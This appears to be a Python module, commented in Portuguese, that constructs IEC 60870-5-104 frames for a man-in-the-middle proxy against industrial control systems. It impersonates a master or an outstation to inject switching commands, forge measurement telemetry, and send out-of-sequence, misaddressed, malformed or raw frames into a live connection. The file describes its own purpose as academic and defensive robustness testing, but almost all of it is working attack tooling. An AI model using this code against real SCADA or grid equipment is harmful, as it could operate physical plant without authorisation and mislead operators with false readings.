"""
Construtores de frame IEC 60870-5-104 para o proxy MITM.

Monta frames validos, forjados campo a campo, ou bytes crus. Reaproveita
integralmente o codec do projeto (src/protocols/iec104/frames.py): nada aqui
reimplementa o protocolo, apenas o usa para impersonar um master ou um slave
ao injetar pacotes no meio de uma conexao real (ver src/attacks/iec104_mitm.py).

Uso academico/defensivo: exercitar a robustez de um endpoint IEC 104 e
evidenciar que o protocolo nao tem autenticacao nativa.
"""

from typing import List, Optional

from ..protocols.iec104.frames import (
    APDUCodec, ASDU, InformationObject, CP56Time2a,
    TypeID, CauseOfTransmission,
    START_BYTE,
    STARTDT_ACT, STOPDT_ACT, TESTFR_ACT,
)


def _fmt_hex(data: bytes) -> str:
    return " ".join(f"{b:02X}" for b in data)


def _parse_value(texto: str):
    """Converte um valor da CLI em bool/int/float."""
    t = texto.strip().lower()
    if t in ("on", "true", "1", "close", "fechar"):
        return True
    if t in ("off", "false", "0", "open", "abrir"):
        return False
    try:
        return int(texto, 0)
    except ValueError:
        pass
    try:
        return float(texto)
    except ValueError:
        return texto


class IEC104AttackSession:
    """Construtor de frames IEC 104 com sequencia (SSN/RSN) propria.

    Nao abre socket - e usado pelo proxy MITM para impersonar um lado da
    conversa (o master ao injetar --> slave, o slave ao injetar --> master),
    com o SSN/RSN sincronizado ao que passa de verdade na linha (ver
    IEC104Mitm._track em iec104_mitm.py).
    """

    def __init__(self, common_address: int = 1, originator: int = 0):
        self.common_address = common_address
        self.originator = originator
        self.ssn = 0          # send sequence number (nosso)
        self.rsn = 0          # receive sequence number (proximo esperado do alvo)

    # ------------------------------------------------------------------
    # Construtores de frame
    # ------------------------------------------------------------------
    def _i_frame(self, asdu: ASDU, ssn: Optional[int] = None,
                 rsn: Optional[int] = None, advance: bool = True) -> bytes:
        use_ssn = self.ssn if ssn is None else ssn
        use_rsn = self.rsn if rsn is None else rsn
        frame = APDUCodec.encode_i_frame(use_ssn, use_rsn, asdu)
        if advance and ssn is None:
            self.ssn = (self.ssn + 1) % 32768
        return frame

    # --- U-frames de sessao ---
    def startdt(self) -> bytes:
        return APDUCodec.encode_u_frame(STARTDT_ACT)

    def stopdt(self) -> bytes:
        return APDUCodec.encode_u_frame(STOPDT_ACT)

    def testfr(self) -> bytes:
        return APDUCodec.encode_u_frame(TESTFR_ACT)

    # --- comandos e interrogacoes legitimos ---
    def general_interrogation(self) -> bytes:
        asdu = ASDU(type_id=TypeID.C_IC_NA_1, num_objects=1,
                    cause=CauseOfTransmission.ACTIVATION,
                    common_address=self.common_address, originator=self.originator,
                    objects=[InformationObject(ioa=0, value=20)])
        return self._i_frame(asdu)

    def single_command(self, ioa: int, on: bool,
                       cot: int = CauseOfTransmission.ACTIVATION,
                       common_address: Optional[int] = None) -> bytes:
        asdu = ASDU(type_id=TypeID.C_SC_NA_1, num_objects=1, cause=cot,
                    common_address=self.common_address if common_address is None
                    else common_address,
                    originator=self.originator,
                    objects=[InformationObject(ioa=ioa, value=on)])
        return self._i_frame(asdu)

    def clock_sync(self) -> bytes:
        asdu = ASDU(type_id=TypeID.C_CS_NA_1, num_objects=1,
                    cause=CauseOfTransmission.ACTIVATION,
                    common_address=self.common_address, originator=self.originator,
                    objects=[InformationObject(ioa=0, timestamp=CP56Time2a.now())])
        return self._i_frame(asdu)

    def read_command(self, ioa: int) -> bytes:
        asdu = ASDU(type_id=TypeID.C_RD_NA_1, num_objects=1,
                    cause=CauseOfTransmission.REQUEST,
                    common_address=self.common_address, originator=self.originator,
                    objects=[InformationObject(ioa=ioa)])
        return self._i_frame(asdu)

    # --- construtor generico: qualquer ASDU, campo a campo ---
    def craft(self, type_id: int, cot: int, ioa: int = 0, val=None,
              common_address: Optional[int] = None, originator: Optional[int] = None,
              ssn: Optional[int] = None, rsn: Optional[int] = None,
              negative: bool = False, test: bool = False) -> bytes:
        obj = InformationObject(ioa=ioa, value=val)
        if type_id in (TypeID.C_CS_NA_1,) and val is None:
            obj.timestamp = CP56Time2a.now()
        asdu = ASDU(
            type_id=type_id, num_objects=1, cause=cot,
            negative=negative, test=test,
            common_address=self.common_address if common_address is None
            else common_address,
            originator=self.originator if originator is None else originator,
            objects=[obj],
        )
        return self._i_frame(asdu, ssn=ssn, rsn=rsn)

    # --- frames deliberadamente irregulares ---
    def out_of_sequence(self, ioa: int = 100, on: bool = True) -> bytes:
        """Comando com SSN muito adiante do esperado (teste de sequenciamento)."""
        asdu = ASDU(type_id=TypeID.C_SC_NA_1, num_objects=1,
                    cause=CauseOfTransmission.ACTIVATION,
                    common_address=self.common_address, originator=self.originator,
                    objects=[InformationObject(ioa=ioa, value=on)])
        bad_ssn = (self.ssn + 1000) % 32768
        return self._i_frame(asdu, ssn=bad_ssn)

    def bad_common_address(self, ioa: int, on: bool) -> bytes:
        """Comando enderecado a um common_address que o alvo nao possui."""
        return self.single_command(ioa, on, common_address=self.common_address + 99)

    def bad_cot(self, ioa: int, on: bool) -> bytes:
        """Comando com causa de transmissao espuria (ex.: SPONTANEOUS num comando)."""
        return self.single_command(ioa, on, cot=CauseOfTransmission.SPONTANEOUS)

    def spoof_measurement(self, ioa: int, value: float) -> bytes:
        """ASDU de monitoramento (M_ME_NC_1) forjado - usado para injetar telemetria falsa."""
        asdu = ASDU(type_id=TypeID.M_ME_NC_1, num_objects=1,
                    cause=CauseOfTransmission.SPONTANEOUS,
                    common_address=self.common_address, originator=self.originator,
                    objects=[InformationObject(ioa=ioa, value=float(value))])
        return self._i_frame(asdu)

    @staticmethod
    def malformed(kind: str = "start") -> bytes:
        """Frames que violam o enquadramento APDU."""
        if kind == "start":                       # byte de inicio invalido
            return bytes([0x99, 0x04, 0x07, 0x00, 0x00, 0x00])
        if kind == "length":                      # length anuncia mais do que existe
            return bytes([START_BYTE, 0xFF, 0x07, 0x00, 0x00, 0x00])
        if kind == "trunc":                       # I-frame com ASDU truncado
            return bytes([START_BYTE, 0x0E, 0x00, 0x00, 0x00, 0x00,
                          TypeID.C_SC_NA_1, 0x01])   # para no meio do ASDU
        return bytes([START_BYTE, 0x01])          # length impossivel

    @staticmethod
    def raw(hexstr: str) -> bytes:
        """Bytes literais a partir de uma string hex ('68 04 07 00 00 00')."""
        limpo = hexstr.replace("0x", "").replace(",", " ")
        return bytes(int(x, 16) for x in limpo.split())


def build_craft(builder: "IEC104AttackSession", args: List[str]) -> bytes:
    """Interpreta 'type=45 cot=6 ioa=101 val=1 ...' e monta o ASDU."""
    kv = {}
    for a in args:
        if "=" in a:
            k, v = a.split("=", 1)
            kv[k.strip().lower()] = v.strip()
    if "type" not in kv or "cot" not in kv:
        raise ValueError("craft exige ao menos type= e cot=")

    def opt(name):
        return int(kv[name], 0) if name in kv else None

    val = _parse_value(kv["val"]) if "val" in kv else None
    return builder.craft(
        type_id=int(kv["type"], 0), cot=int(kv["cot"], 0),
        ioa=int(kv.get("ioa", 0), 0), val=val,
        common_address=opt("ca"), originator=opt("oa"),
        ssn=opt("ssn"), rsn=opt("rsn"),
    )


def build_from_command(b: "IEC104AttackSession", cmd: str, args: List[str]) -> bytes:
    """Traduz um comando textual em bytes de frame, usando `b` como construtor.

    Reaproveitado pelo console de gerencia do main.py e pelo proxy MITM
    (mitm.py). Nao envia nada - apenas devolve os bytes prontos, que quem
    chamou decide para onde injetar.
    """
    v = _parse_value
    if cmd == "startdt":
        return b.startdt()
    if cmd == "stopdt":
        return b.stopdt()
    if cmd == "testfr":
        return b.testfr()
    if cmd == "gi":
        return b.general_interrogation()
    if cmd == "command":
        return b.single_command(int(args[0]), v(args[1]))
    if cmd == "clock":
        return b.clock_sync()
    if cmd == "read":
        return b.read_command(int(args[0]))
    if cmd == "spoof":
        return b.spoof_measurement(int(args[0]), float(args[1]))
    if cmd == "oos":
        return b.out_of_sequence(int(args[0]), v(args[1]))
    if cmd == "badcot":
        return b.bad_cot(int(args[0]), v(args[1]))
    if cmd == "badaddr":
        return b.bad_common_address(int(args[0]), v(args[1]))
    if cmd == "craft":
        return build_craft(b, args)
    if cmd == "raw":
        return b.raw(" ".join(args))
    if cmd == "malformed":
        return b.malformed(args[0] if args else "start")
    raise ValueError(f"comando desconhecido: {cmd}")
